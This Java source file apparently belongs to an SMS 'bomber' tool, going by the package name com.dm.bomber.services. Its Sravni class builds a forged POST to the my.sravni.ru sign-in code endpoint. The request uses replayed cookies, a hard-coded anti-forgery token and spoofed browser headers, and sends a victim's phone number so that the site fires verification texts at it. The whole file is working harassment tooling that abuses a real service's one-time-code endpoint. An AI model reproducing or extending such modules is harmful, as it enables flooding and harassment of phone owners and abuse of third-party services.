package com.dm.bomber.services;

import okhttp3.FormBody;
import okhttp3.Request;

public class Sravni extends FormService {

    public Sravni() {
        setUrl("https://my.sravni.ru/signin/code");
        setMethod(POST);
    }

    @Override
    public Request buildRequest(Request.Builder builder) {
        builder.addHeader("Cookie", "_ym_uid=1605105660244322467;_ym_d=1605105660;.ASPXANONYMOUS=jvxYwEsMfk6BXQlriYYL-A;_SL_=6.1509745.1509752.;_ipl=6.1509745.1509752.;AB_CREDIT=Test_00035_A;AB_CREDIT_DIRECT=never;__utmz=utmccn%3d(not%20set)%7cutmcct%3d(not%20set)%7cutmcmd%3dorganic%7cutmcsr%3dyandex%7cutmctr%3d(not%20set);__utmx=utmccn%3d(not%20set)%7cutmcct%3d(not%20set)%7cutmcmd%3dorganic%7cutmcsr%3dyandex%7cutmctr%3d(not%20set);_gcl_au=1.1.1184645255.1615059953;_gid=GA1.2.2020936344.1615059954;_ga=GA1.1.438067474.1615059954;_ym_isad=1;_ym_visorc=b;_fbp=fb.1.1615059955644.1650744830;_ga_TEQH0NKK0Q=GS1.1.1615059953.1.0.1615059960.53;.AspNetCore.Antiforgery.vnVzMy2Mv7Q=CfDJ8Mo79Uhrc61BkNG7HBanVqey_muvSzqi8_qIWrDo7MvoMz1r6iPZhAwaENKUFBCsiIHPPym3PgRb6xnirgX748K_CmjcUdOCglvTvyYhl6X8hX4N3BFiH_-8LFKVUPq5VsP0Cu_jIIaR6ZNHpJCBvEQ;reuserid=7f78bafd-738d-4923-8eb8-4541519c3745");
        builder.addHeader("Connection", "keep-alive");
        builder.addHeader("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36 OPR/72.0.3815.207");
        builder.addHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
        builder.addHeader("Accept", "*/*");
        builder.addHeader("Origin", "https://my.sravni.ru");
        builder.addHeader("Sec-Fetch-Site", "same-origin");
        builder.addHeader("Sec-Fetch-Mode", "cors");
        builder.addHeader("Sec-Fetch-Dest", "empty");
        builder.addHeader("Referer", "https://my.sravni.ru/signin?ReturnUrl=%2Fconnect%2Fauthorize%2Fcallback%3Fclient_id%3Dwww%26scope%3Dopenid%2520offline_access%2520email%2520phone%2520profile%2520roles%2520Sravni.Reviews.Service%2520Sravni.Osago.Service%2520Sravni.QnA.Service%2520Sravni.FileStorage.Service%2520Sravni.Memory.Service%2520reviews%2520Sravni.PhoneVerifier.Service%2520Sravni.Identity.Service%2520Sravni.VZR.Service%2520messagesender.sms%2520Sravni.Affiliates.Service%2520esia%2520orders.r%26response_type%3Dcode%2520id_token%2520token%26redirect_uri%3Dhttps%253A%252F%252Fwww.sravni.ru%252Fopenid%252Fcallback%252F%26response_mode%3Dform_post%26state%3DRmridyVgj733j_o_VUUUdgSTeMe1W3FdxzSMsz4IWP0%26nonce%3DzrwOa2xfDJLNRbfKi36P2VDjfAmlLZ-EnKg4u4Whwxs%26login_hint%26acr_values&isinnerframe=true");
        builder.addHeader("Accept-Language", "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7");

        return super.buildRequest(builder);
    }

    @Override
    public void buildBody(FormBody.Builder builder) {
        builder.add("__RequestVerificationToken", "CfDJ8Mo79Uhrc61BkNG7HBanVqfddj1HvO3ZSASCL80JzDrO0POC-Mgp1O-nte3Fk2FzD_MSBw6-P9d4Q8229e4gXa7YRY1nYzTh7U82Qs3QLA-dttR2kfxtMxoWZYlvX34LeXH8U9JDHgyxQcOkGoCs2Nk");
        builder.add("phone", getFormattedPhone());
        builder.add("returnUrl", "/connect/authorize/callback?client_id=www&amp;scope=openid%20offline_access%20email%20phone%20profile%20roles%20Sravni.Reviews.Service%20Sravni.Osago.Service%20Sravni.QnA.Service%20Sravni.FileStorage.Service%20Sravni.Memory.Service%20reviews%20Sravni.PhoneVerifier.Service%20Sravni.Identity.Service%20Sravni.VZR.Service%20messagesender.sms%20Sravni.Affiliates.Service%20esia%20orders.r&amp;response_type=code%20id_token%20token&amp;redirect_uri=https%3A%2F%2Fwww.sravni.ru%2Fopenid%2Fcallback%2F&amp;response_mode=form_post&amp;state=RmridyVgj733j_o_VUUUdgSTeMe1W3FdxzSMsz4IWP0&amp;nonce=zrwOa2xfDJLNRbfKi36P2VDjfAmlLZ-EnKg4u4Whwxs&amp;login_hint&amp;acr_values");
    }
}
